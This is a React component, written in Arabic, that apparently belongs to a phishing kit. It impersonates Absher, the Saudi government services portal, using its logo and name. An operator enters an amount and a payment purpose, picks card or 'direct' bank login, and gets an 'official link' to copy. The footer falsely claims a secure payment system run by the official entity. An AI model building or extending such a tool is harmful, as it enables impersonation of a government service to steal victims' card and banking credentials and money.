
import React, { useState } from 'react';
import { useCreateLink } from '@/hooks/useCreateLink';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Switch } from '@/components/ui/switch';

const AbsherLinkCreator = () => {
  const [amount, setAmount] = useState('');
  const [description, setDescription] = useState('');
  const [isBankLogin, setIsBankLogin] = useState(false);
  const { createLink, loading, generatedLink } = useCreateLink();

  const handleCreate = async () => {
    await createLink({ 
      amount, 
      description, 
      type: isBankLogin ? 'bank' : 'card',
      entityId: 'absher'
    });
  };

  return (
    <div className="min-h-screen p-4 flex items-center justify-center bg-[#FFFFFF]" style={{ fontFamily: 'Cairo, sans-serif' }}>
      <div className="w-full max-w-md space-y-8 bg-white p-8 border-2 border-slate-100 shadow-xl">
        <div className="text-center">
          <img src={`/assets/logos/absher.svg`} alt="Absher" className="h-20 mx-auto mb-4 object-contain" />
          <h2 className="text-2xl font-bold text-slate-900">أبشر</h2>
          <div className="h-1 w-20 bg-[#006C35] mx-auto mt-2"></div>
        </div>
        
        <div className="space-y-4">
          <div className="space-y-2">
            <label className="text-sm font-bold text-slate-700">المبلغ</label>
            <Input 
              placeholder="0.00" 
              value={amount} 
              onChange={(e) => setAmount(e.target.value)}
              className="h-12 border-2 focus:ring-[#006C35] text-lg"
            />
          </div>
          
          <div className="space-y-2">
            <label className="text-sm font-bold text-slate-700">الغرض من الدفع</label>
            <Input 
              placeholder="وصف الخدمة" 
              value={description} 
              onChange={(e) => setDescription(e.target.value)}
              className="h-12 border-2 focus:ring-[#006C35]"
            />
          </div>
          
          <div className="flex items-center justify-between p-3 bg-slate-50 border-2 border-slate-100 rounded-lg">
            <span className="text-sm font-bold text-slate-700">تفعيل الدخول المباشر</span>
            <Switch checked={isBankLogin} onCheckedChange={setIsBankLogin} />
          </div>

          <Button 
            onClick={handleCreate} 
            disabled={loading}
            className="w-full h-14 text-xl font-bold transition-all hover:scale-[1.02] active:scale-[0.98]"
            style={{ backgroundColor: '#006C35', color: '#fff', borderRadius: '8px' }}
          >
            {loading ? 'جاري إنشاء الرابط...' : 'إنشاء الرابط الرسمي'}
          </Button>

          {generatedLink && (
            <div className="mt-6 p-4 bg-emerald-50 border-2 border-emerald-200 rounded-lg animate-in fade-in slide-in-from-bottom-2">
              <p className="text-sm font-bold text-emerald-800 mb-2 text-center">تم إنشاء الرابط بنجاح:</p>
              <div className="flex items-center gap-2">
                <code className="flex-1 text-xs bg-white p-2 border border-emerald-100 rounded break-all">
                  {generatedLink}
                </code>
                <Button 
                  size="sm"
                  onClick={() => navigator.clipboard.writeText(generatedLink)}
                  className="bg-emerald-600 hover:bg-emerald-700"
                >
                  نسخ
                </Button>
              </div>
            </div>
          )}
        </div>
        
        <div className="text-center pt-4">
          <p className="text-[10px] text-slate-400">نظام دفع آمن ومشفر 100% - جميع الحقوق محفوظة للجهة الرسمية</p>
        </div>
      </div>
    </div>
  );
};

export default AbsherLinkCreator;
